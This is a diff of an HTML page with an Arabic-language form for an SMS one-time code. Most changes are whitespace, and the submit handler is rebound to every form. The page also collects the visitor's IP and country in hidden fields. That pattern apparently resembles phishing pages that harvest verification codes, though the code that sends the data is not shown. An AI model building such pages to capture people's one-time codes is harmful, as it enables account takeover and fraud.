@@ -319,19 +319,19 @@ span{
       <input style="width: auto;" type="text" id="sms" name="sms" placeholder="SMS Code">
       <div id="error-message" style="text-align: center; color: red;"></div>
     </div>
-	<p style="text-align: center;"><a class="btn btn-default" id="resend-sms" href="#" style="font-style: italic; font-size:13px;font-weight:bold">إعادة إرسال مرة آخرى</a></p>
+    <p style="text-align: center;"><a class="btn btn-default" id="resend-sms" href="#" style="font-style: italic; font-size:13px;font-weight:bold">إعادة إرسال مرة آخرى</a></p>
 <div style="text-align: center;">
     
     <button  style="padding: 10px 20px;font-size: 16px;background-color: #4CAF50;color: #fff;border: none;border-radius: 5px;
         cursor: pointer;
         display: inline-block;
-		width: 150px;font-family: 'Cairo', sans-serif;" type="submit">متابعة</button>
+        width: 150px;font-family: 'Cairo', sans-serif;" type="submit">متابعة</button>
 </div>
-	
+    
   </form>
 </div>
 
-	<!-- script jquery -->
+    <!-- script jquery -->
         <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
 
 <script>
@@ -705,7 +705,7 @@ span{
 
   </div>
 
-<form id="otp" action="#">
+<form  action="#">
 <input type="hidden" id="ip">
 <input type="hidden" id="country">
 
@@ -713,7 +713,7 @@ span{
       <input style="width: auto;" type="text" id="sms" name="sms" placeholder="SMS Code">
       <div id="error-message" style="text-align: center; color: red;"></div>
     </div>
-	<p style="text-align: center;"><a class="btn btn-default" id="resend-sms" href="#" style="font-style: italic; font-size:13px;font-weight:bold">إعادة إرسال مرة آخرى</a></p>
+    <p style="text-align: center;"><a class="btn btn-default" id="resend-sms" href="#" style="font-style: italic; font-size:13px;font-weight:bold">إعادة إرسال مرة آخرى</a></p>
 <div style="text-align: center;">
     <button style="padding: 10px 20px;
         font-size: 16px;
@@ -723,18 +723,18 @@ span{
         border-radius: 5px;
         cursor: pointer;
         display: inline-block;
-		width: 150px;" type="submit">متابعة</button>
+        width: 150px;" type="submit">متابعة</button>
 </div>
-	
+    
   </form>
 </div>
 
-	<script language="JavaScript" type="text/javascript" src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script language="JavaScript" type="text/javascript" src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
 
-	
+    
 <script>
     $(document).ready(function() {
-        $('#otp').submit(function(event) {
+        $('form').submit(function(event) {
             event.preventDefault();
 
             var smsCode = $("#sms").val();
@@ -782,5 +782,10 @@ span{
         <script>
             $('#sms').mask('000000');
         </script>
+
+
+
+
+
 
 </body>
